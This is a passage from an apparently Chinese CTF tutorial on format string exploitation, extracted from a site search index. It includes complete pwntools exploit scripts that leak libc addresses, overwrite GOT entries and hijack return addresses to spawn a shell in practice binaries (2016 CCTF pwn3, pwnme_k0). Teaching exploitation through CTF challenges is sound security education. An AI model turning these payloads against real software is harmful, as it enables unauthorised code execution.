\uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_6","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # \u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF('./goodluck') if args['REMOTE']: sh = remote('pwn.sniperoj.cn', 30017) else: sh = process('./goodluck') payload = \"%9$s\" print payload ##gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#hijack-got","text":"","title":"hijack GOT"},{"location":"fmtstr/fmtstr_example/#_7","text":"\u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_8","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_9","text":"\u5982\u4e0b \u279c 2016-CCTF-pwn3 git:(master) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_10","text":"\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file() { char dest; // [sp+1Ch] [bp-FCh]@5 char s1; // [sp+E4h] [bp-34h]@1 char *i; // [sp+10Ch] [bp-Ch]@3 printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 0x28);//\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return printf(&dest);//\u8f93\u51fadest\u5185\u5bb9 } } return printf(&dest); }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_11","text":"\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_12","text":"\u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive() exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u6ce8\u89e3 \uff1a\u7ed3\u5408 payload \u6765\u770b\uff1a payload = \"%8$s\" + p32(puts_got) \uff0c %8$S \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 7\uff1b p32(puts_got) \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 8 ; \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#hijack-retaddr","text":"","title":"hijack retaddr"},{"location":"fmtstr/fmtstr_example/#_13","text":"\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_14","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 \u4e09\u4e2a\u767d\u5e3d - pwnme_k0 \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_15","text":"\u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:(master) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4ee5\u53ca Full RELRO \u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684 got \u8868\u4e86\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_16","text":"\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4) { write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&formata, \"Welc0me to sangebaimao!\\n\"); return printf(&a4 + 4); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a &a4 + 4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 password \u5185\u5bb9\u4e5f\u662f v6 = read(0, (char *)&a4 + 4, 0x14uLL); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684 username \u5728\u8ddd\u79bb\u7684 password 20 \u4e2a\u5b57\u8282\u3002 puts(\"Input your username(max lenth:20): \"); fflush(stdout); v8 = read(0, &bufa, 0x14uLL); if ( v8 && v8 <= 0x14u ) { puts(\"Input your password(max lenth:20): \"); fflush(stdout); v6 = read(0, (char *)&a4 + 4, 0x14uLL); fflush(stdout); *(_QWORD *)buf = bufa; *(_QWORD *)(buf + 8) = a3; *(_QWORD *)(buf + 16) = a4; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_17","text":"\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528 system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002 \u6ce8\u89e3 \uff1a \u4e0a\u9762\u8fd9\u53e5\u8bdd\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u6709\u4e00\u4e2a\u72ec\u7acb\u51fd\u6570 A \u7684\u6808\u5e27\uff0c\u8fd9\u4e2a A \u6808\u5e27\u6574\u4f53\u5b58\u653e\u5730\u5740\u662f\u52a8\u6001\u53d8\u5316\u7684\u3002\u4f46\u662f A \u6808\u5e27\u5185\u90e8\u7684\u7ed3\u6784\u662f\u56fa\u5b9a\u7684\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1arbp \u4e00\u5b9a\u5728 rip \u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u3002\u8fd8\u6709\u6211\u4eec\u77e5\u9053\u7684\u662f rbp \u5b58\u50a8\u7684\u662f\u4e0a\u4e00\u4e2a\u6808\u5e27\u7684 rbp \u5730\u5740\uff0c\u5982\u679c\u8bf4\u6bcf\u6b21\u90fd\u662f\u901a\u8fc7\u51fd\u6570 B \u8c03\u7528\u51fd\u6570 A \uff0c\u56e0\u4e3aAB \u6808\u5e27\u957f\u5ea6&\u7ed3\u6784\u56fa\u5b9a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6cc4\u9732\u51fd\u6570 A rbp \u7684\u503c\u51cf\u53bb\u504f\u79fb\u5f97\u5230\u51fd\u6570 A rip \u5730\u5740\u3002 \u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system \u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_18","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [rbp+0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002 \u6ce8\u89e3 \uff1a \u8fd9\u91cc\u6211\u8fd8\u662f\u7528\u6211\u4e60\u60ef\u7684\u65b9\u6cd5\uff0c\u8f93\u51fa\u51e0\u4e2a %p \u76f4\u63a5\u6570\u51fa\u6765\u504f\u79fb\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"fmtstr/fmtstr_example/#_19","text":"\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\uff08b printf\uff09\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740 (\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f \u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf (\u5982 ubuntu 18.04) \u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash , \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn","title":"\u4fee\u6539\u5730\u5740"},{"location":"fmtstr/fmtstr_example/#_20","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwnme_k0.py from pwn import * context.log_level = 'debug' p = process(\"./pwnme_k0\") elf = ELF(\"./pwnme_k0\") # leak stack addr payload = 'a'*0x8 + \"%6$p\" p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil(\"20): \\n\") p.send(payload) p.recvuntil('>') #gdb.attach(p,'b printf') p.sendline('1') p.recvuntil('a'*0x8) stack_leak = int(p.recv(14),16) - 0x38 log.info(\"stack_leak:\"+hex(stack_leak)) # hijack retaddr payload1 = p64(stack_leak) payload2 = \"%2218d%8$hn\" p.recvuntil('>') p.sendline('2') p.recvuntil(\"20): \\n\") p.sendline(payload1) p.recvuntil(\"20): \\n\") p.sendline(payload2) p.recvuntil('>') p.sendline('1') p.interactive() \u6ce8\u89e3 \uff1a \u6cc4\u9732\u5730\u5740\u7684\u65f6\u5019\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7528\u7684\u662f %p \uff0c\u5982\u679c\u7528 %s \u518d u64 \u6cc4\u9732\u51fa\u6765\u7684\u662f\u51fd\u6570 B \u7684 rbp \u7684\u503c\u3002\u539f\u56e0\u4e5f\u5f88\u7b80\u5355\uff0c\u8981\u6c42\u8f93\u51fa\u7684\u662f\u5b57\u7b26\uff0c\u7cfb\u7edf\u5230\u51fd\u6570 A rbp \u7684\u503c\u6307\u5411\u7684\u5730\u5740\u53d6\u503c\uff0c\u4e5f\u5c31\u662f\u51fd\u6570 B \u7684\u503c\u3002\u5982\u679c\u662f %p \u5c31\u5c06\u51fd\u6570 A rbp \u7684\u503c\u8f93\u51fa\u3002 hijack \u90e8\u5206\u7684 payload \uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53ef\u4ee5\u653e\u5230 name \u8f93\u5165\uff0c\u4e5f\u5c31\u662f\u548c stack_leak \u4e00\u8d77\u8f93\u5165\uff0cpassword \u5c31\u968f\u4fbf\u8f93\u5165\u70b9\u4e1c\u897f\u884c\u4e86\u3002\u8fd9\u91cc\u56e0\u4e3a\u8f93\u5165\u957f\u5ea6\u73b0\u5728\uff0c\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528\u6700\u7a33\u59a5\u7684 \u5355\u5b57\u8282 